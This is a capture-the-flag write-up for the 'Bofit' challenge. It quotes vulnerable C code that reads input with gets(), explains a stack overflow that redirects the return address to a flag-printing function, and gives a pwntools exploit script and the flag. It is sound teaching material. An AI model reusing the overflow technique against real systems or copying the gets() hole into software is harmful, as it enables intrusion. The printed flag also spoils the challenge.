## Bofit

### Challenge Description  
Because Bop It is copyrighted, apparently.  
`nc umbccd.io 4100`   

### Writeup
We are given a server and it's `C` code.  
In `main` function we are asked to enter character `B`. Then we enter to `play_game` function that runs the game. If ther server says `BOF it!` we have to answer with `B`, if says `Pull it!` we have to answer with `P`, if says `Twist it!` we have to answer with `T` and if it says `Shout it!` a `get` function will take input from user and if this input is less that 10 chars, it will break the loop and game will be finished.  
```c
int play_game(){
	char c;
	char input[20];
	int choice;
	bool correct = true;
	int score = 0;
	srand(time(0));
	while(correct){
		choice = rand() % 4;
		choice = 3;
		switch(choice){
			case 0:
				printf("BOF it!\n");
				c = getchar();
				if(c != 'B') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 1:
				printf("Pull it!\n");
				c = getchar();
				if(c != 'P') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 2:
				printf("Twist it!\n");
				c = getchar();
				if(c != 'T') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
		}
		score++;
	}
	return score;
}
```
So we can use this `get` function to overflow and rewrite return address of `play_game` function with address of `win_game` function that prints the flag.  
The address of `win_game` functio is `0x0000000000401256`. We have to insert 56 extra chars to reach return address.  
Finally we wrote script bellow to interact with the server. First time that `Shout it!` comes up, we enter `'A'*56 + pwn.p32(0x0000000000401256)` and second time we just enter something to break the loop. It gives us the flag.  
```python
from pwn import *
import pwn
import time

conn = remote('umbccd.io', '4100')
#conn = process('./bofit')
print(conn.recvuntil("BOF it to start!\n"))
conn.sendline("B")

counter = 0
while True:
	data = conn.recvline()
	if(data == ""):
		continue
	print(data)
	if(data[0] == "P"):
		conn.sendline("P")
	elif(data[0] == "B"):
		conn.sendline("B")
	elif(data[0] == "T"):
		conn.sendline("T")
	else:
		if(counter == 1):
			conn.sendline("A")
		conn.sendline('A'*56 + pwn.p32(0x0000000000401256))
		counter = counter + 1
```
Here is the flag:  
```
DawgCTF{n3w_h1gh_sc0r3!!}
```